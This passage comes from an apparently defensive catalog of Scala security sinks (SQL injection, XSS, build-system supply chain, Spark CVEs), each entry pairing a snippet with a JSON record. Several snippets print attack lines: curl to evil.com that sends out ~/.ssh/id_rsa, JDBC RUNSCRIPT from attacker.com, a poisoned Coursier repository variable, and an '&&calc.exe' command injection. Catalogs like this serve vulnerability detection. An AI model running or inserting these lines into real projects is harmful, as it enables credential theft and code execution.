```scala
val original: ArraySeq[Int] = ArraySeq(1, 2, 3)
val mapped: ArraySeq[Int] = original.map(_ * 2)
mapped.unsafeArray.asInstanceOf[Array[Int]].head  // ClassCastException!
```

**Ref**: Scala Contributors — "Is ArraySeq fit for purpose?".

```json
{ "sink_id": "SCALA-COLL-005", "category": "collections", "title": "ArraySeq unsafeArray type confusion", "severity": "medium", "sources": [{ "type": "forum", "url": "https://contributors.scala-lang.org/t/is-arrayseq-fit-for-purpose/3736", "title": "Is ArraySeq fit for purpose?", "author": "Scala Contributors", "date": "2019-06-01" }], "confidence": "confirmed" }
```

---

## 7. Database / ORM

### 7.1 Slick `#$` Literal Splicing — SQL Injection
**Risk**: Slick's `#$` interpolator splices raw strings directly into SQL — bypassing all parameterization.

```scala
import slick.jdbc.H2Profile.api._
sql"""select #$column from #$table where name = $value""".as[(String, String)]
// #$column and #$table are raw spliced — attacker controls the SQL
```

**Ref**: Lightbend — Slick Plain SQL Queries documentation.

```json
{ "sink_id": "SCALA-DB-001", "category": "database", "title": "Slick #$ literal splicing SQL injection", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://scala-slick.org/doc/3.3.3/sql.html#splicing-literal-values", "title": "Slick Plain SQL — Splicing Literal Values", "author": "Lightbend", "date": "2019-01-01" }], "confidence": "confirmed" }
```

### 7.2 Doobie `Fragment.const` — Raw SQL Injection
**Risk**: Doobie's `Fragment.const` embeds raw SQL strings — using user input in `Fragment.const` yields SQL injection.

```scala
import doobie._
val frag = fr"SELECT name FROM users WHERE " ++ Fragment.const(filter)
frag.query[String].to[List]  // filter is raw SQL
```

**Ref**: Rob Norris — Doobie Escaping documentation.

```json
{ "sink_id": "SCALA-DB-002", "category": "database", "title": "Doobie Fragment.const raw SQL injection", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://tpolecat.github.io/doobie/docs/14-Escaping.html", "title": "Doobie — Escaping", "author": "Rob Norris", "date": "2020-01-01" }], "confidence": "confirmed" }
```

### 7.3 Quill `infix` / `executeQueryRaw` — Raw SQL Injection
**Risk**: Quill's `infix` embeds raw SQL into the query AST; `executeQueryRaw` accepts raw SQL strings — both enable full SQL injection.

```scala
import io.getquill._
ctx.run { quote { query[User].filter(u => infix"$condition".as[Boolean]) } }
// or: ctx.executeQueryRaw(userControlledSql)
```

**Ref**: Quill Project — SQL Contexts documentation.

```json
{ "sink_id": "SCALA-DB-003", "category": "database", "title": "Quill infix/executeQueryRaw SQL injection", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://getquill.io/#contexts-sql-contexts-querying-sql", "title": "Quill SQL Contexts", "author": "Quill Project", "date": "2022-01-01" }], "confidence": "confirmed" }
```

### 7.4 Anorm `#$value` / String Concatenation Injection
**Risk**: Anorm's `#$` interpolator embeds literal values; `SQL(string)` with concatenation is an open injection vector.

```scala
import anorm._
SQL"SELECT name FROM #$table WHERE id = $id".as(scalar[String].singleOpt)
SQL("SELECT id FROM users WHERE username = '" + username + "'").as(scalar[Long].singleOpt)
```

**Ref**: Anorm — String Interpolation documentation.

```json
{ "sink_id": "SCALA-DB-004", "category": "database", "title": "Anorm #$ literal interpolation SQL injection", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://playframework.github.io/anorm/#string-interpolation", "title": "Anorm — String Interpolation", "author": "Play Framework / Anorm Project", "date": "2022-01-01" }], "confidence": "confirmed" }
```

### 7.5 JDBC URL Injection via HikariCP — RCE
**Risk**: If JDBC URL is user-controlled, H2 `INIT RUNSCRIPT` or PostgreSQL `socketFactory` enables RCE.

```scala
// jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.com/evil.sql'
// jdbc:postgresql://localhost/test?socketFactory=...
```

**Ref**: CVE-2021-42392 (H2 console RCE), CVE-2022-23221 (H2 `INIT RUNSCRIPT`), CVE-2022-21724 (PostgreSQL `socketFactory`).

```json
{ "sink_id": "SCALA-DB-005", "category": "database", "title": "JDBC URL injection RCE via HikariCP", "severity": "critical", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-42392", "title": "CVE-2021-42392 — H2 console RCE", "author": "NVD", "date": "2022-01-10" }, { "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-21724", "title": "CVE-2022-21724 — pgjdbc socketFactory RCE", "author": "NVD", "date": "2022-02-03" }], "confidence": "confirmed" }
```

### 7.6 Skunk `sql` Interpolator `#$` Literal Splicing
**Risk**: Skunk (PostgreSQL for Scala) uses the same `#$` pattern for literal splicing — identical injection surface to Slick.

```scala
import skunk._
sql"SELECT name FROM #$table ORDER BY id LIMIT $limit".query(varchar)
```

**Ref**: Rob Norris — Skunk documentation.

```json
{ "sink_id": "SCALA-DB-006", "category": "database", "title": "Skunk sql interpolator #$ injection", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://tpolecat.github.io/skunk/", "title": "Skunk SQL Interpolation", "author": "Rob Norris", "date": "2021-01-01" }], "confidence": "confirmed" }
```

---

## 8. Scala.js & Scala Native

### 8.1 Scala.js `innerHTML` XSS via DOM API
**Risk**: User-controlled input assigned to DOM `innerHTML` through Scala.js facades.

```scala
document.getElementById("comment-display").innerHTML = comment  // XSS
// Also via js.Dynamic.global:
js.Dynamic.global.document.getElementById("foo").innerHTML = "<img src=x onerror=alert(1)>"
```

**Ref**: Scala.js for JavaScript developers.

```json
{ "sink_id": "SCALA-JS-001", "category": "scalajs-native", "title": "Scala.js innerHTML XSS via DOM API", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://www.scala-js.org/doc/sjs-for-js/", "title": "Scala.js for JavaScript developers", "author": "Scala.js Project", "date": "2025-01-01" }], "confidence": "confirmed" }
```

### 8.2 `js.Dynamic` eval — Arbitrary JavaScript Execution
**Risk**: `js.Dynamic.global.eval(code)` executes arbitrary JavaScript — full XSS/RCE in browser context.

```scala
js.Dynamic.global.eval(userInput)  // Arbitrary JavaScript execution
// Also via Function constructor: js.Dynamic.global.Function("return " + userInput)
```

**Ref**: Scala.js — Access to JavaScript global scope.

```json
{ "sink_id": "SCALA-JS-002", "category": "scalajs-native", "title": "Scala.js js.Dynamic eval arbitrary JS execution", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://www.scala-js.org/doc/interoperability/global-scope.html", "title": "Access to the JavaScript global scope", "author": "Scala.js Project", "date": "2025-01-01" }], "confidence": "confirmed" }
```

### 8.3 CVE-2022-28355 — `UUID.randomUUID()` Insecure PRNG
**Risk**: Scala.js <1.10.0 `java.util.UUID.randomUUID()` used `java.util.Random` (48-bit state LCG) instead of `SecureRandom` — UUID prediction after observing a single generated UUID.

```scala
val sessionToken = UUID.randomUUID().toString  // Only 2^48 possible values
```

**Ref**: Sébastien Doeraene — GHSA-j2f9-w8wh-9ww4 / CVE-2022-28355.

```json
{ "sink_id": "SCALA-JS-003", "category": "scalajs-native", "title": "UUID.randomUUID() insecure PRNG (CVE-2022-28355)", "severity": "high", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-28355", "title": "CVE-2022-28355", "author": "NVD", "date": "2022-04-02" }], "confidence": "confirmed" }
```

### 8.4 Scala.js Dynamic Import — Module Injection
**Risk**: `js.import[A](moduleName)` with attacker-controlled module name loads arbitrary JS modules.

```scala
js.`import`[js.Any](pluginName)  // Loads arbitrary JS module (e.g., "https://evil.com/payload.js")
```

**Ref**: Scala.js — Emitting JavaScript modules.

```json
{ "sink_id": "SCALA-JS-004", "category": "scalajs-native", "title": "Scala.js dynamic import module injection", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://www.scala-js.org/doc/project/module.html", "title": "Emitting JavaScript modules", "author": "Scala.js Project", "date": "2025-01-01" }], "confidence": "confirmed" }
```

### 8.5 Scala.js `asInstanceOf` Erasure at JS Boundary
**Risk**: For types inheriting from `js.Any`, `asInstanceOf[T]` is completely erased — no runtime type check. Any value can be cast to any JS type.

```scala
trait Config extends js.Object { val admin: Boolean = js.native }
val cfg = js.Dynamic.global.attackerConfig.asInstanceOf[Config]
if (cfg.admin) grantAccess()  // Bypass — type check erased
```

**Ref**: Scala.js Semantics documentation.

```json
{ "sink_id": "SCALA-JS-005", "category": "scalajs-native", "title": "Scala.js asInstanceOf erasure for js.Any types", "severity": "high", "sources": [{ "type": "documentation", "url": "https://www.scala-js.org/doc/semantics.html", "title": "Semantics of Scala.js", "author": "Scala.js Project", "date": "2025-01-01" }], "confidence": "confirmed" }
```

### 8.6 Scala Native `unsafe.Ptr` — Memory Safety (UB)
**Risk**: Scala Native's `unsafe.Ptr[T]` provides unchecked pointer arithmetic — null dereference, use-after-free, OOB — all undefined behavior.

```scala
import scala.scalanative.unsafe._
val nullPtr: Ptr[Int] = null
!nullPtr  // UB: segfault or arbitrary read
```

**Ref**: Scala Native — Native code interoperability documentation.

```json
{ "sink_id": "SCALA-NATIVE-001", "category": "scalajs-native", "title": "Scala Native unsafe.Ptr memory safety UB", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://scala-native.org/en/latest/user/interop.html", "title": "Native code interoperability", "author": "Scala Native Project", "date": "2025-01-01" }], "confidence": "confirmed" }
```

### 8.7 Scala Native Zone.alloc — Uninitialized Memory Disclosure
**Risk**: `Zone.alloc` does NOT zero memory (unlike the package-level `alloc`). Accidentally using `z.alloc` vs `alloc` leaks heap contents.

**Ref**: LeeTibbert — Scala Native GitHub Issue #4700.

```json
{ "sink_id": "SCALA-NATIVE-002", "category": "scalajs-native", "title": "Zone.alloc uninitialized memory disclosure", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/scala-native/scala-native/issues/4700", "title": "Zone alloc unfriendly gotcha", "author": "LeeTibbert", "date": "2025-12-04" }], "confidence": "confirmed" }
```

### 8.8 `@JSExportAll` — Unintended API Exposure
**Risk**: `@JSExportAll` blindly exports all public members to JavaScript, including internal methods and mutable state.

**Ref**: Scala.js — Export Scala.js APIs to JavaScript.

```json
{ "sink_id": "SCALA-JS-006", "category": "scalajs-native", "title": "@JSExportAll unintended API exposure", "severity": "medium", "sources": [{ "type": "documentation", "url": "https://www.scala-js.org/doc/interoperability/export-to-javascript.html", "title": "Export Scala.js APIs to JavaScript", "author": "Scala.js Project", "date": "2025-01-01" }], "confidence": "confirmed" }
```

---

## 9. Build System & Dependencies

### 9.1 CVE-2026-32948 — sbt URI Fragment Command Injection (Windows)
**Risk**: sbt passes URI fragments from `RootProject()` to `cmd /c` without sanitization on Windows.

```scala
lazy val vulnerable = RootProject(
  uri("https://github.com/attacker/repo.git#develop%26%26calc.exe")
)
```

**Ref**: Anatolii Kmetiuk (Scala Center) — CVE-2026-32948.

```json
{ "sink_id": "SCALA-BUILD-001", "category": "build-system", "title": "sbt URI fragment command injection (CVE-2026-32948)", "severity": "high", "sources": [{ "type": "blog", "url": "https://www.scala-lang.org/blog/2026/03/31/sbt-security-advisory.html", "title": "Fixing a Command Injection Vulnerability in sbt", "author": "Anatolii Kmetiuk", "date": "2026-03-31" }], "confidence": "confirmed" }
```

### 9.2 CVE-2023-46122 — sbt IO.unzip Zip Slip
**Risk**: `IO.unzip` does not validate zip entry paths — path traversal via `../` in zip entries.

**Ref**: eed3si9n — GHSA-h9mw-grgx-2fhf / CVE-2023-46122.

```json
{ "sink_id": "SCALA-BUILD-002", "category": "build-system", "title": "sbt IO.unzip Zip Slip (CVE-2023-46122)", "severity": "high", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-46122", "title": "CVE-2023-46122", "author": "NVD", "date": "2023-10-22" }], "confidence": "confirmed" }
```

### 9.3 sbt Plugin Auto-Discovery — Arbitrary Code Execution at Build Time
**Risk**: sbt auto-discovers plugins from `project/plugins.sbt` with no sandboxing. Any plugin executes arbitrary Scala code in the sbt JVM.

```scala
// project/plugins.sbt — any plugin has full system access at build time:
addSbtPlugin("com.malicious" % "sbt-exfiltrator" % "1.0.0")
```

**Ref**: sbt Using Plugins documentation; Scala Center advisory.

```json
{ "sink_id": "SCALA-BUILD-003", "category": "build-system", "title": "sbt plugin auto-discovery arbitrary code execution", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://www.scala-sbt.org/1.x/docs/Using-Plugins.html", "title": "sbt Using Plugins", "author": "scala-sbt.org", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 9.4 sbt Dependency Confusion / TypoSquatting
**Risk**: Attackers register on Maven Central with organization/artifact names matching private projects — sbt picks the attacker's artifact.

**Ref**: Russ Cox — "Our Software Dependency Problem".

```json
{ "sink_id": "SCALA-BUILD-004", "category": "build-system", "title": "sbt dependency confusion / typoSquatting", "severity": "high", "sources": [{ "type": "article", "url": "https://research.swtch.com/deps", "title": "Our Software Dependency Problem", "author": "Russ Cox", "date": "2019-01-23" }], "confidence": "confirmed" }
```

### 9.5 sbt `sourceGenerators` / `resourceGenerators` — Code Injection
**Risk**: A malicious dependency registers source generators that execute arbitrary code at build time — injecting into the compilation pipeline.

```scala
sourceGenerators in Compile += Def.task {
  // Arbitrary code runs in sbt JVM during compile
  import scala.sys.process._
  "curl https://evil.com/steal".!!
  Seq(maliciousSource)
}.taskValue
```

**Ref**: sbt Howto — Generating files.

```json
{ "sink_id": "SCALA-BUILD-005", "category": "build-system", "title": "sbt sourceGenerators arbitrary code injection", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://www.scala-sbt.org/1.x/docs/Howto-Generating-Files.html", "title": "sbt Generating Files", "author": "scala-sbt.org", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 9.6 Macro Annotation Supply Chain — Compile-Time RCE in Consumer's Project
**Risk**: Published Scala macros run arbitrary code at *compile time* in the *consumer's project* — enabling exfiltration and backdoor injection without runtime dependencies.

```scala
// A published macro library (added as a dependency):
// At compile time, the macro runs arbitrary code in the consumer's JVM:
def maliciousImpl(c: whitebox.Context)(annottees: c.Expr[Any]*): c.Expr[Any] = {
  import scala.sys.process._
  "curl https://evil.com/steal?p=$(cat ~/.ssh/id_rsa)".!!
  annottees.head
}
```

**Ref**: Eugene Burmako — Scala Macros Guide; supply chain analysis by Scala Center.

```json
{ "sink_id": "SCALA-BUILD-006", "category": "build-system", "title": "Macro annotation supply chain compile-time RCE", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/overviews/macros/overview.html", "title": "Scala Macros", "author": "Eugene Burmako", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 9.7 Coursier Alternate-Resolver Injection — Silent Dependency Substitution
**Risk**: Coursier (used by sbt, Mill, Scala CLI) resolves repositories from multiple sources in priority order: `COURSIER_REPOSITORIES` env var, `~/.config/coursier/repositories` (Linux) / `~/Library/Preferences/Coursier/repositories` (macOS), then `sbt`'s `resolvers` setting. An attacker who controls CI environment variables or developer dotfiles prepends a malicious Maven mirror; Coursier fetches and executes attacker-controlled JARs silently at build and test time. No checksum mismatch occurs if the attacker also controls a matching POM.

```bash
# CI pipeline poisoned via env var:
export COURSIER_REPOSITORIES="https://evil.com/maven|central"
# sbt / scala-cli now fetches from evil.com first for every artifact
```

**Ref**: Coursier — Repositories documentation; mirror configuration.

```json
{ "sink_id": "SCALA-BUILD-007", "category": "build-system", "title": "Coursier alternate-resolver injection via env var or config file", "severity": "high", "sources": [{ "type": "documentation", "url": "https://get-coursier.io/docs/other-repositories", "title": "Coursier — Repositories", "author": "Coursier Contributors", "date": "2024-01-01" }, { "type": "github", "url": "https://github.com/coursier/coursier/blob/main/docs/pages/reference-repositories.md", "title": "Coursier repository reference", "author": "Coursier Contributors", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 9.8 Scala Steward Auto-PR — Malicious Mirror Auto-Merge Supply Chain
**Risk**: Scala Steward polls Maven Central for version bumps and opens PRs automatically. If the Steward bot has write access and the repository auto-merges Steward PRs (common practice), an attacker who publishes a higher-versioned artifact on the trusted registry (or compromises the registry mirror Steward polls) gets their payload merged without human review. The risk compounds with `SNAPSHOT` dependencies, which Steward can update to any snapshot build including attacker-published ones.

```scala
// build.sbt before Steward PR:
"com.legitimate" %% "library" % "1.2.3"
// After auto-merged Steward PR (attacker published 1.2.4-compromised to Central):
"com.legitimate" %% "library" % "1.2.4"  // merged automatically, malicious artifact
```

**Ref**: Scala Steward documentation — Auto-merge configuration.

```json
{ "sink_id": "SCALA-BUILD-008", "category": "build-system", "title": "Scala Steward auto-PR auto-merge supply chain risk", "severity": "high", "sources": [{ "type": "documentation", "url": "https://github.com/scala-steward-org/scala-steward/blob/main/docs/faq.md", "title": "Scala Steward FAQ — Auto-merge", "author": "Scala Steward Contributors", "date": "2024-01-01" }], "confidence": "likely" }
```

### 9.9 sbt Credentials File — Plaintext Registry Credentials
**Risk**: sbt reads registry credentials from `~/.sbt/credentials` (and `~/.sbt/1.0/credentials`) as a plaintext Java properties file. These files are frequently committed accidentally (missing `.gitignore` entry) or world-readable on shared CI machines, exposing publish credentials for Maven Central, Artifactory, or private Nexus registries. Leaked publish credentials allow an attacker to overwrite existing artifacts with malicious versions.

```
# ~/.sbt/credentials — plaintext, often world-readable:
realm=Sonatype Nexus Repository Manager
host=oss.sonatype.org
user=myuser
password=s3cr3tP@ssword
```

**Ref**: sbt — Credentials documentation.

```json
{ "sink_id": "SCALA-BUILD-009", "category": "build-system", "title": "sbt credentials file plaintext registry credentials", "severity": "high", "sources": [{ "type": "documentation", "url": "https://www.scala-sbt.org/1.x/docs/Publishing.html#Credentials", "title": "sbt Publishing — Credentials", "author": "scala-sbt.org", "date": "2024-01-01" }], "confidence": "confirmed" }
```

---

## 10. Functional Effect Systems

### 10.1 Cats Effect `unsafeRunSync()` — Thread Blocking + Error Swallowing
**Risk**: `unsafeRunSync()` from within callbacks blocks the caller thread; errors from failed fibers may be silently swallowed.

```scala
import cats.effect.IO
IO.raiseError(new RuntimeException("Boom!")).unsafeRunSync()  // Error silently swallowed in some contexts
```

**Ref**: Typelevel — Cats Effect Issue #2980.

```json
{ "sink_id": "SCALA-EFFECT-001", "category": "effect-systems", "title": "Cats Effect unsafeRunSync thread blocking and error swallowing", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/typelevel/cats-effect/issues/2980", "title": "Unsafe run sync in CE3", "author": "Typelevel", "date": "2021-09-01" }], "confidence": "confirmed" }
```

### 10.2 ZIO `Runtime.unsafeRun` — Referential Transparency Bypass
**Risk**: `Unsafe.unsafe` and `Runtime.unsafeRun` bypass fiber supervision, interruption, and resource safety.

```scala
import zio.{Runtime, Unsafe, ZIO}
implicit val unsafe: Unsafe = Unsafe.unsafe
Runtime.default.unsafe.run(ZIO.sleep(60.seconds))  // fiber leaked — no supervision
```

**Ref**: ZIO Unsafe API Reference; ZIO Issue #8465.

```json
{ "sink_id": "SCALA-EFFECT-002", "category": "effect-systems", "title": "ZIO Runtime.unsafeRun RT bypass", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/zio/zio/issues/8465", "title": "Thread pool resource leak", "author": "ZIO Contributors", "date": "2023-08-01" }], "confidence": "confirmed" }
```

### 10.3 fs2 TCP Socket FD Leak on DNS Resolution Failure
**Risk**: `Network[IO].client()` leaks socket file descriptors when the target hostname cannot be resolved.

**Ref**: Typelevel — fs2 Issue #2643.

```json
{ "sink_id": "SCALA-EFFECT-003", "category": "effect-systems", "title": "fs2 TCP socket FD leak on DNS failure", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/typelevel/fs2/issues/2643", "title": "fs2 leaks socket FDs on unresolvable hostnames", "author": "Typelevel", "date": "2022-01-01" }], "confidence": "confirmed" }
```

### 10.4 fs2 Scope Resource Leak on `handleErrorWith`
**Risk**: When recovering from failure inside a `.scope` block, `closeScope` is never invoked — leaked file handles, connections, and memory.

**Ref**: Typelevel — fs2 Issue #1022.

```json
{ "sink_id": "SCALA-EFFECT-004", "category": "effect-systems", "title": "fs2 scope resource leak on handleErrorWith", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/typelevel/fs2/issues/1022", "title": "Scope not closed on error recovery", "author": "Typelevel", "date": "2018-01-01" }], "confidence": "confirmed" }
```

### 10.5 ZIO `Queue.offerAll` — Silent Hang / Bidirectional Deadlock
**Risk**: ZIO's bounded `Queue` with default backpressure causes `offerAll` to silently suspend the calling fiber. In bidirectional patterns: deadlock.

**Ref**: ZIO Issue #567 (John A. De Goes).

```json
{ "sink_id": "SCALA-EFFECT-005", "category": "effect-systems", "title": "ZIO Queue.offerAll silent hang and deadlock", "severity": "medium", "sources": [{ "type": "issue", "url": "https://github.com/zio/zio/issues/567", "title": "Bounded queue hangs on offerAll", "author": "ZIO Contributors", "date": "2019-02-10" }], "confidence": "confirmed" }
```

### 10.6 ZIO `ZStream.ensuring` Finalizer Deferral Deadlock
**Risk**: `ZStream.ensuring` finalizer deferred to channel executor close — mutual promise dependency creates deadlock.

**Ref**: ZIO Issue #8544.

```json
{ "sink_id": "SCALA-EFFECT-006", "category": "effect-systems", "title": "ZStream.ensuring finalizer deferral deadlock", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/zio/zio/issues/8544", "title": "ZStream.ensuring finalizer deferral deadlock", "author": "ZIO Contributors", "date": "2023-01-01" }], "confidence": "confirmed" }
```

### 10.7 Cats Effect `cancelable` Resource Leak on Cancellation Race
**Risk**: `IO.cancelable` leaks resources when cancellation races with successful completion — the result is discarded and no finalizer runs.

**Ref**: Typelevel — Cats Effect Issue #3474.

```json
{ "sink_id": "SCALA-EFFECT-007", "category": "effect-systems", "title": "Cats Effect cancelable resource leak on race", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/typelevel/cats-effect/issues/3474", "title": "cancelable may leak resources", "author": "Typelevel", "date": "2022-06-01" }], "confidence": "confirmed" }
```

---

## 11. Concurrency

### 11.1 `scala.concurrent.blocking` Omission — ForkJoinPool Starvation
**Risk**: Blocking calls inside `Future` on `ExecutionContext.global` without `blocking { }` causes thread starvation — all threads blocked = deadlock.

```scala
import scala.concurrent.{Future, blocking}
// BAD:
Future { Thread.sleep(3000) }  // Occupies pool thread silently
// GOOD:
Future { blocking { Thread.sleep(3000) } }  // ForkJoinPool compensates
```

**Ref**: Michael Zajac — Stack Overflow on `scala.concurrent.blocking`.

```json
{ "sink_id": "SCALA-CONC-001", "category": "concurrency", "title": "Missing blocking wrapper causes ForkJoinPool starvation", "severity": "critical", "sources": [{ "type": "stackoverflow", "url": "https://stackoverflow.com/questions/29068064/scala-concurrent-blocking-what-does-it-actually-do", "title": "scala.concurrent.blocking — what does it do?", "author": "Michael Zajac", "date": "2015-03-16" }], "confidence": "confirmed" }
```

### 11.2 `Await.result` Inside Future on Fixed Pool — Deadlock
**Risk**: Using `Await.result` inside a `Future` callback on a fixed-size thread pool causes deadlock by thread exhaustion.

```scala
val smallPool = ExecutionContext.fromExecutorService(Executors.newFixedThreadPool(2))
Future { Await.result(Future { 42 }, 5.seconds) }(smallPool)  // DEADLOCK
```

**Ref**: Michael Weber — kindatechnical.com.

```json
{ "sink_id": "SCALA-CONC-002", "category": "concurrency", "title": "Await.result inside Future on fixed pool deadlock", "severity": "critical", "sources": [{ "type": "article", "url": "https://kindatechnical.com/scala/executioncontext-and-thread-pool-management.html", "title": "ExecutionContext and Thread Pool Management", "author": "Michael Weber", "date": "2026-03-01" }], "confidence": "confirmed" }
```

### 11.3 `lazy val` Circular Initialization Deadlock
**Risk**: Scala's `lazy val` in circular/recursive initialization from multiple threads can deadlock.
**Version note**: Scala 2.12+ implements SIP-20 — circular cases on a single thread now throw rather than deadlock; cross-thread races on independent `lazy val`s with monitor-based locking can still deadlock. Scala 3 changes the synchronization scheme again (per-instance offset bitmap).

```scala
object Deadlock {
  lazy val a: Int = b + 1
  lazy val b: Int = a + 1  // Thread 1: a→needs b; Thread 2: b→needs a → DEADLOCK
}
```

**Ref**: SI-7646 — lazy val initialization deadlock.

```json
{ "sink_id": "SCALA-CONC-003", "category": "concurrency", "title": "lazy val circular initialization deadlock", "severity": "high", "sources": [{ "type": "issue", "url": "https://github.com/scala/bug/issues/7646", "title": "SI-7646: lazy val initialization deadlock", "author": "scabug", "date": "2013-01-01" }], "confidence": "confirmed" }
```

### 11.4 `synchronized` Lock Ordering Violation Deadlock
**Risk**: Scala's `this.synchronized` pattern makes lock ordering easy to miss — two objects locking each other in reverse order across threads = deadlock.

```scala
case class Account(var balance: Int) {
  def transfer(amount: Int, to: Account): Unit = this.synchronized {
    to.synchronized { this.balance -= amount; to.balance += amount }
  }
}
```

**Ref**: Alexandru Nedelcu — Scala Best Practices.

```json
{ "sink_id": "SCALA-CONC-004", "category": "concurrency", "title": "synchronized lock ordering violation deadlock", "severity": "high", "sources": [{ "type": "guide", "url": "https://alexn.org/blog/2017/01/13/thread-safety-and-contention/", "title": "Thread Safety and Contention", "author": "Alexandru Nedelcu", "date": "2017-01-13" }], "confidence": "confirmed" }
```

---

## 12. Apache Spark & Big Data

### 12.1 CVE-2022-33891 — Spark UI Shell Command Injection
**Risk**: `HttpSecurityFilter` with `spark.acls.enable=true` builds shell command from user-controlled `doAs` parameter without sanitization.

```scala
// The permission check does something like:
val groupsCommand = s"id -Gn ${request.getParameter("doAs")}"
groupsCommand.!!  // RCE
```

**Ref**: Apache Spark — CVE-2022-33891 (CVSS 8.8).

```json
{ "sink_id": "SCALA-SPARK-001", "category": "spark-bigdata", "title": "Spark UI shell command injection (CVE-2022-33891)", "severity": "critical", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-33891", "title": "CVE-2022-33891", "author": "NVD / Apache", "date": "2022-07-18" }], "confidence": "confirmed" }
```

### 12.2 UDF/Closure Serialization RCE — By Design
**Risk**: Spark's architecture allows RCE by design — UDF closures are serialized on driver, deserialized on executors. Loading untrusted JARs or submitting jobs via Livy = arbitrary code execution.

**Ref**: Apache Spark Security FAQ.

```json
{ "sink_id": "SCALA-SPARK-002", "category": "spark-bigdata", "title": "UDF/closure serialization RCE", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://spark.apache.org/security.html", "title": "Apache Spark Security FAQ", "author": "Apache Software Foundation", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 12.3 CVE-2020-9480 — Standalone Master Authentication Bypass RCE (CVSS 9.8)
**Risk**: Crafted RPC to Spark standalone master bypasses shared-secret authentication — arbitrary code execution on cluster.

**Ref**: Ayoub Elaassal — CVE-2020-9480.

```json
{ "sink_id": "SCALA-SPARK-003", "category": "spark-bigdata", "title": "Spark standalone master auth bypass (CVE-2020-9480)", "severity": "critical", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-9480", "title": "CVE-2020-9480", "author": "NVD / Apache", "date": "2020-06-23" }], "confidence": "confirmed" }
```

### 12.4 CVE-2023-22946 — Proxy-User Privilege Escalation
**Risk**: Applications using `spark-submit --proxy-user` can bypass privilege restrictions by providing malicious config classes on the classpath.

**Ref**: Apache Spark — CVE-2023-22946.

```json
{ "sink_id": "SCALA-SPARK-004", "category": "spark-bigdata", "title": "Spark proxy-user privilege escalation (CVE-2023-22946)", "severity": "critical", "sources": [{ "type": "cve", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22946", "title": "CVE-2023-22946", "author": "NVD / Apache", "date": "2023-04-17" }], "confidence": "confirmed" }
```

### 12.5 Spark SQL Injection via `spark.sql()` String Interpolation
**Risk**: User input interpolated into `spark.sql()` enables SQL injection — accessing arbitrary tables/views, bypassing DataFrame-level controls.

```scala
val query = s"SELECT * FROM users WHERE username = '$userInput'"
spark.sql(query)  // Injection if userInput contains ' OR '1'='1
```

**Ref**: Apache Spark SQL Programming Guide.

```json
{ "sink_id": "SCALA-SPARK-005", "category": "spark-bigdata", "title": "Spark SQL injection via spark.sql() string interpolation", "severity": "high", "sources": [{ "type": "documentation", "url": "https://spark.apache.org/docs/latest/sql-programming-guide.html", "title": "Spark SQL Guide", "author": "Apache Software Foundation", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 12.6 Spark ML Model Unsafe Deserialization
**Risk**: Loading an ML model (`PipelineModel.load()`) deserializes untrusted data — Arbitrary `readObject()` chains on driver and executors.

**Ref**: Apache Spark Security FAQ — "Is loading an ML model secure?" (answer: no).

```json
{ "sink_id": "SCALA-SPARK-006", "category": "spark-bigdata", "title": "Spark ML model unsafe deserialization", "severity": "critical", "sources": [{ "type": "documentation", "url": "https://spark.apache.org/security.html", "title": "Apache Spark Security - ML models", "author": "Apache Software Foundation", "date": "2024-01-01" }], "confidence": "confirmed" }
```

### 12.7 Spark Configuration Property Injection
**Risk**: Job configuration can override security properties — disabling auth, encryption, or redirecting data to attacker-controlled sinks.

```scala
spark.conf.set("spark.authenticate", "false")
spark.conf.set("spark.eventLog.dir", "hdfs://attacker-hdfs:8020/logs")
```

**Ref**: Apache Spark Configuration Guide.

```json
{ "sink_id": "SCALA-SPARK-007", "category": "spark-bigdata", "title": "Spark configuration property injection", "severity": "high", "sources": [{ "type": "documentation", "url": "https://spark.apache.org/docs/latest/configuration.html", "title": "Spark Configuration", "author": "Apache Software Foundation", "date": "2024-01-01" }], "confidence": "confirmed" }
```

---

## 13. Cross-Cutting & Ecosystem

### 13.1 TASTy Unsigned Deserialization — Type Integrity Bypass (Scala 3)
**Risk**: Scala 3's TASTy format has zero integrity verification. A tampered TASTy entry in a JAR injects false type information into the compiler, enabling type-level attacks.

**Ref**: Scala 3 TASTy format specification.

```json
{ "sink_id": "SCALA-XC-001", "category": "cross-cutting", "title": "TASTy unsigned deserialization", "severity": "high", "sources": [{ "type": "documentation", "url": "https://docs.scala-lang.org/scala3/reference/tasty.html", "title": "Scala 3 TASTy", "author": "EPFL", "date": "2024-01-01" }], "confidence": "theoretical" }
```

### 13.2 Ammonite REPL `import $ivy` — No Sandbox (Critical)
